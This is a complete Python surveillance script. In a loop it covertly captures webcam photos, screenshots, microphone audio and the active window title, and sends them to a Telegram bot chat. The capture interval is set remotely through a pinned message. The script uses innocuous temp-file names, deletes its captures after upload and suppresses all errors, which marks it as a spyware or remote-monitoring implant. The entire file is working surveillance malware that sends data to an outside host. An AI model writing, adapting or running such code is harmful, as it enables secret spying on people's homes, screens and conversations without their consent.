import os
import time
import cv2
import sounddevice as sd
from scipy.io import wavfile
import requests
from dotenv import load_dotenv
from PIL import ImageGrab
import numpy as np
import tempfile
import re

# Platform specific imports
try:
    import pygetwindow as gw
except ImportError:
    gw = None

load_dotenv()

# Configuration
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")

INTERVAL = 60  
AUDIO_DURATION = 5  
SAMPLE_RATE = 44100

def get_temp_path(filename):
    return os.path.join(tempfile.gettempdir(), filename)

def get_active_window():
    if gw:
        try:
            window = gw.getActiveWindow()
            return window.title if window else "Unknown"
        except Exception:
            return "Error retrieving window"
    return "Non-Windows Environment"

def send_text_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    if TOPIC_GENERAL and str(TOPIC_GENERAL) != "1":
        payload["message_thread_id"] = TOPIC_GENERAL
    try:
        requests.post(url, data=payload)
    except Exception:
        pass

def update_remote_config():
    """Checks the PINNED message in the group to get the broadcasted interval."""
    global INTERVAL
    url = f"https://api.telegram.org/bot{TOKEN}/getChat"
    try:
        resp = requests.post(url, data={"chat_id": CHAT_ID}, timeout=10).json()
        if resp.get("ok"):
            pinned = resp.get("result", {}).get("pinned_message", {})
            text = pinned.get("text", "").strip()
            
            # Extract digits from the pinned message
            nums = re.findall(r'\d+', text)
            if nums:
                new_val = int(nums[0])
                if 10 <= new_val <= 3600 and new_val != INTERVAL:
                    old_val = INTERVAL
                    INTERVAL = new_val
                    send_text_message(f"🔄 Sync: Interval changed from {old_val}s to {INTERVAL}s via Pinned Message.")
    except Exception:
        pass

def capture_webcam(filename):
    cam = cv2.VideoCapture(0)
    if not cam.isOpened(): return False
    time.sleep(0.5)
    ret, frame = cam.read()
    if ret:
        _, buffer = cv2.imencode('.jpg', frame)
        buffer.tofile(filename)
    cam.release()
    return ret

def capture_screenshot(filename):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(filename, format='JPEG')
        return True
    except: return False

def capture_audio(filename):
    try:
        recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)
        sd.wait()
        wavfile.write(filename, SAMPLE_RATE, recording)
        return True
    except: return False

def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
    url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    cap = f"LOG: {window_title}"
    
    def post(u, tid, extra, fls):
        p = {"chat_id": CHAT_ID, "caption": extra}
        if tid and str(tid) != "1": p["message_thread_id"] = tid
        try: requests.post(u, data=p, files=fls)
        except: pass

    if os.path.exists(screen_file):
        with open(screen_file, "rb") as f: 
            post(url_photo, TOPIC_SCREENSHOT, f"LOG_S\n{cap}", {"photo": ("s.jpg", f, "image/jpeg")})
            
    if os.path.exists(webcam_file):
        with open(webcam_file, "rb") as f: 
            post(url_photo, TOPIC_WEBCAM, f"LOG_W\n{cap}", {"photo": ("w.jpg", f, "image/jpeg")})

    if os.path.exists(audio_file):
        with open(audio_file, "rb") as f: 
            post(url_doc, TOPIC_AUDIO, f"LOG_A\n{cap}", {"document": ("a.wav", f, "audio/wav")})

def main():
    if not TOKEN or not CHAT_ID: return

    # Initial check to sync with current pin before starting loop
    update_remote_config()
    send_text_message(f"🚀 SVC ONLINE. Mode: Broadcast Sync. Current Interval: {INTERVAL}s")

    w_f = get_temp_path("idx_01.tmp")
    s_f = get_temp_path("idx_02.tmp")
    a_f = get_temp_path("idx_03.tmp")

    try:
        while True:
            ctx = get_active_window()
            capture_webcam(w_f)
            capture_screenshot(s_f)
            capture_audio(a_f)
            send_to_telegram(ctx, w_f, s_f, a_f)
            
            for f in [w_f, s_f, a_f]:
                if os.path.exists(f):
                    try: os.remove(f)
                    except: pass

            # Wait and check for pin updates
            wait_start = time.time()
            while time.time() - wait_start < INTERVAL:
                update_remote_config()
                time.sleep(10)
            
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
